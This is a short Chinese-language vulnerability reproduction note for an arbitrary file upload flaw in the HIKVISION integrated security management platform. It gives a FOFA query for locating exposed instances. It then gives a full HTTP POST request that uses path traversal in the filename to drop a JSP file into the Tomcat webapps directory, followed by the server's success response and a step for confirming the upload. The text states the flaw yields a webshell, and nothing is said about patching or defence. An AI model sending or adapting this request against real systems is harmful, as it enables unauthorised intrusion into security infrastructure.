1.漏洞描述：<font style="color:rgb(53, 53, 53);">HiKVISION综合安防管理平台 /center/api/files;.js 接口存在任意文件上传漏洞，攻击者可以通过漏洞上传木马到服务器中，获得webshell。</font>

<font style="color:rgb(53, 53, 53);"></font>

<font style="color:rgb(53, 53, 53);">  
</font><font style="color:rgb(53, 53, 53);">2.fofa语句："</font><font style="color:rgb(221, 17, 68);">HIKVISION-综合安防管理平台"</font>





3.漏洞复现

    （1）发送数据包

```plain
POST /center/api/files;.js HTTP/1.1
Host: xx.xx.xx.xx:1443
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36

------WebKitFormBoundaryxxmdzwoe
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"
Content-Type:image/jpeg

<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>
------WebKitFormBoundaryxxmdzwoe--
```

      （2）查看响应包      

```python
HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: application/json;charset=UTF-8
Content-Length: 337
Set-Cookie: JSESSIONID=73715E162ED9A0675D10A1644EEB3F12; Path=/center; HttpOnly;secure
Content-Language: zh_CN
Expires: 0
Content-Disposition: inline;filename=f.txt
Date: Mon, 11 Sep 2023 02:26:26 GMT



{"code":"0","data":{"filename":"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp","link":"http://192.168.240.1:8001/download1/center_faq/resource/5dab28a3-485a-4928-b358-0c73d3f2c40a/../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp","id":"5dab28a3-485a-4928-b358-0c73d3f2c40a"},"msg":""}
```

        （3）拼接路径查看上传的文件书否存在  在网站后拼接_<font style="color:rgb(175, 175, 175);">/clusterMgr/ukgmfyufsi.jsp;.js</font>_

            ![](https://cdn.nlark.com/yuque/0/2024/png/48235409/1734748869567-66b65958-048e-431f-94b7-dfe8efe27b9d.png)

  
<font style="color:rgba(255, 255, 255, 0.8);">http</font>  
<font style="color:rgba(255, 255, 255, 0.8);">https</font>

